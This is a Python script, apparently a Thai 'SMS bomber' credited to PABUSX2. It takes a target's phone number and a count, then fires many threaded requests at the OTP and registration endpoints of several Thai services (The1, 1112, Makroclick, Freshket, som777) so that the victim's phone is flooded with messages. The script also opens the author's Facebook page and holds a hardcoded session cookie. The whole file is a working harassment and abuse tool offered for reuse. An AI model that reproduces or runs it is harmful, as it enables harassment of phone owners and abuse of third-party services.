import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
os.system("clear")
os.system("xdg-open https://www.facebook.com/profile.php?id=100078690540090")
print("")
print("\033[36m[\033[37m1\033[36m] \033[32mspamsms : the1")
time.sleep(1)
print("\033[36m[\033[37m2\033[36m] \033[32mspamsms : 1112")
time.sleep(1)
print("\033[36m[\033[37m3\033[36m] \033[33mspamsms : makrolick")
time.sleep(1)
print("\033[36m[\033[37m4\033[36m] \033[37mspamsms : freshket")
time.sleep(1)
print("\033[36m[\033[37m5\033[36m] \033[35mspamsms : som77")
time.sleep(1)
print("\033[36m[\033[37m6\033[36m] \033[36mspamsms : ALL")
time.sleep(1)
print("\033[36m[\033[37m7\033[36m] \033[33mเครดิตคนทำ")
time.sleep(1)
print("\033[36m[\033[37m8\033[36m] \033[32mคำเตือน!!! ควรอ่าน#")
time.sleep(1)
print("\033[36m[\033[37m00\033[36m] \033[32mออก ✓")
print("")
ok = input ("\033[36mNumber \033[32m: ")
print("")
if ok == '1':
 print("")
 print("SPAMSMS  the1 BY : PABUSX2")
 print("")
 phone = input("\033[36mphone \033[32m:  \033[31m")
 jam = int(input("\033[36mnum \033[32m:  \033[31m"))
 print("")
 print("# กำลังยิงให้อยู่เฉยๆ # ")
 print("")
 
 def api1():
 	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
 
 
 for i in range(jam):
 	threading.Thread(target=api1).start()
 
if ok == '2':
 print("")
 print("SPAMSMS  1112 BY : PABUSX2")
 print("")
 phone = input("\033[36mphone \033[32m:  \033[31m")
 jam = int(input("\033[36mnum \033[32m:  \033[31m"))
 print("")
 print("# กำลังยิงให้อยู่เฉยๆ # ")
 print("")
 
 def api1():
 	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})
     
 
 for i in range(jam):
 	threading.Thread(target=api1).start()
 
if ok == '3':
 print("")
 print("SPAMSMS  makrolick BY : PABUSX2")
 print("")
 phone = input("\033[36mphone \033[32m:  \033[31m")
 jam = int(input("\033[36mnum \033[32m:  \033[31m"))
 print("")
 print("# กำลังยิงให้อยู่เฉยๆ # ")
 print("")
 
 def api1():
 	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
     
 
 for i in range(jam):
 	threading.Thread(target=api1).start()

if ok == '4':
 print("")
 print("SPAMSMS  freshket BY : PABUSX2")
 print("")
 phone = input("\033[36mphone \033[32m:  \033[31m")
 jam = int(input("\033[36mnum \033[32m:  \033[31m"))
 print("")
 print("# กำลังยิงให้อยู่เฉยๆ # ")
 print("")
 
 def api1():
 	requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"})
     
 
 for i in range(jam):
 	threading.Thread(target=api1).start()

if ok == '5':
 print("")
 print("SPAMSMS  som777 BY : PABUSX2")
 print("")
 phone = input("\033[36mphone \033[32m:  \033[31m")
 jam = int(input("\033[36mnum \033[32m:  \033[31m"))
 print("")
 print("# กำลังยิงให้อยู่เฉยๆ # ")
 print("")
 
 def api1():
 	requests.post("https://www.som777.com/api/otp/register",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "_ga=GA1.1.1673326082.1656501932;_ga_JK8982QL0T=GS1.1.1656501931.1.0.1656501932.0;connect.sid=s%3AjmuodpRmujaNQUtIEfDiOhfmF_h2o3fI.E4Eaa1lU9MLW31p5kuUP076GUHpr5HkxscwU1TjgA0M"},data=f"applicant=%2B66{phone[1:]}&serviceName=SOM777")
     
 
 for i in range(jam):
 	threading.Thread(target=api1).start()

if ok == '6':
 print("")
 print("SPAMSMS  ALL BY : PABUSX2")
 print("")
 phone = input("\033[36mphone \033[32m:  \033[31m")
 jam = int(input("\033[36mnum \033[32m:  \033[31m"))
 print("")
 print("# กำลังยิงให้อยู่เฉยๆ # ")
 print("")
 
 def api1():
 	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
 
 def api2():
 	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
     
 def api3():
 	requests.post("https://www.som777.com/api/otp/register",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "_ga=GA1.1.1673326082.1656501932;_ga_JK8982QL0T=GS1.1.1656501931.1.0.1656501932.0;connect.sid=s%3AjmuodpRmujaNQUtIEfDiOhfmF_h2o3fI.E4Eaa1lU9MLW31p5kuUP076GUHpr5HkxscwU1TjgA0M"},data=f"applicant=%2B66{phone[1:]}&serviceName=SOM777")
 
 def api4():
 	requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"})
 
 def api5():
 	requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"})

 for i in range(jam):
 	threading.Thread(target=api1).start()
 threading.Thread(target=api2).start()
 threading.Thread(target=api3).start()
 threading.Thread(target=api4).start()
 threading.Thread(target=api5).start()
 
if ok == '7':
 print("")
 print("\033[36mSPAMSMS BY \033[32m: \033[31mPABUSX2")
 print("")  
 print("\033[36mYouTube \033[32m: \033[31mPABUSX2")
 print("")
 print("\033[36mFacebook \033[32m: \033[31mSorakrit Nonthawong")
 print("")
 print("\033[36mDiscord \033[32m: \033[31mZERO.exe#8888")

if ok == '8':
 print("")
 print("\033[31mคำเตือน!!!")
 print("")  
 print("\033[36mบาง api อาจจะไม่ออกนะครับ")
 print("")
 print("\033[32mเเจกต่อให้เครดิตด้วยนะครับ")
 print("")
 print("\033[33mกดติดตามด้วยนะครับขอบคุณครับ")
 
if ok == '00':
 print("")
 os.system("exit")
 